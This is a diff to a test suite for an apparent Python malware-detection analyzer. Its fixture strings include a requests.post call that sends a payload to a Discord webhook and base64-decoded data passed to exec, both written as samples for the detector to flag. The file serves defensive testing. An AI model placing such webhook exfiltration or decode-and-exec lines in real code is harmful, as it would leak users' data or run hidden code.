@@ -13,6 +13,15 @@ def test_only_flags_payload_when_it_reaches_execution_sink():
     assert result["findings"] == []
 
 
+def test_benign_execution_sink_is_not_a_finding():
+    result = analyze_python_sources({
+        "sample.py": "command = input('command: ')\nsubprocess.run([command])\n",
+    })
+
+    assert result["anomaly_score"] == 0
+    assert result["findings"] == []
+
+
 def test_traces_decoded_payload_to_sink():
     blob = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" * 2
     result = analyze_python_sources({"sample.py": f"import base64\npayload = base64.b64decode('{blob}')\nexec(payload)\n"})
@@ -29,7 +38,7 @@ def test_malformed_python_is_visible_as_anomaly():
 
 def test_static_signatures_are_merged_and_scored():
     result = analyze_python_sources({
-        "callback.py": "url = 'https://discord.com/api/webhooks/example'\n",
+        "callback.py": "requests.post('https://discord.com/api/webhooks/example', data=payload)\n",
     })
 
     assert result["anomaly_score"] == 60
@@ -43,7 +52,7 @@ def test_static_signature_score_caps_with_behavioral_findings():
         "mixed.py": (
             f"payload = base64.b64decode('{blob}')\n"
             "exec(payload)\n"
-            "url = 'https://discord.com/api/webhooks/example'\n"
+            "requests.post('https://discord.com/api/webhooks/example', data=payload)\n"
         ),
     })
 
